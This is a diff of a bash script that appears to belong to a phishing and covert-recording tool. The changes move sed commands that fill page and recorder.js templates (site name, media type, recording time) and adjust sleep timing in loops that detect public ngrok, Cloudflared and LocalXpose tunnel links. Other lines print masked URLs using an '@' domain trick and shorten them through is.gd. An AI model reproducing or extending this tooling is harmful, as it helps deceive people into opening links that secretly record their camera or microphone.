@@ -210,14 +210,10 @@ manage_tunneler() {
 # Set template
 url_manager() {
     if [[ "$2" == "1" ]]; then
-        sed "s+siteName+"$dir"+g" template.php > index.php
-        sed "s+mediaType+"$TYPE"+g" template.js | sed "s+recordingTime+"$DURATION"+g" > recorder.js
         echo -e "${info}Your urls are: \n"
     fi
-    sleep 1
     echo -e "${success}URL ${2} > ${1}\n"
     echo -e "${success}URL ${3} > ${mask}@${1#https://}\n"
-    sleep 1
     netcheck
     if echo $1 | grep -q "$TUNNELER"; then
         shortened=$(curl -s "https://is.gd/create.php?format=simple&url=${1}")
@@ -669,6 +665,8 @@ else
 fi
 sleep 10
 cd "$HOME/.site"
+sed "s+siteName+"$dir"+g" template.php > index.php
+sed "s+mediaType+"$TYPE"+g" template.js | sed "s+recordingTime+"$DURATION"+g" > recorder.js
 ngroklink=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z.]*.ngrok.io")
 if ! [ -z "$ngroklink" ]; then
     ngrokcheck=true
@@ -678,6 +676,7 @@ fi
 for second in {1..10}; do
     if [ -f "$HOME/.tunneler/cf.log" ]; then
         cflink=$(grep -o "https://[-0-9a-z]*.trycloudflare.com" "$HOME/.tunneler/cf.log")
+        sleep 1
     fi
     if ! [ -z "$cflink" ]; then
         cfcheck=true
@@ -685,11 +684,11 @@ for second in {1..10}; do
     else
         cfcheck=false
     fi
-    sleep 1
 done
 for second in {1..10}; do
     if [ -f "$HOME/.tunneler/loclx.log" ]; then
         loclxlink=$(grep -o "[-0-9a-z]*\.loclx.io" "$HOME/.tunneler/loclx.log")
+        sleep 1
     fi
     if ! [ -z "$loclxlink" ]; then
         loclxcheck=true
@@ -698,7 +697,6 @@ for second in {1..10}; do
     else
         loclxcheck=false
     fi
-    sleep 1
 done
 if ( $ngrokcheck && $cfcheck && $loclxcheck ); then
     echo -e "${success}Ngrok, Cloudflared and Loclx have started successfully!\n"
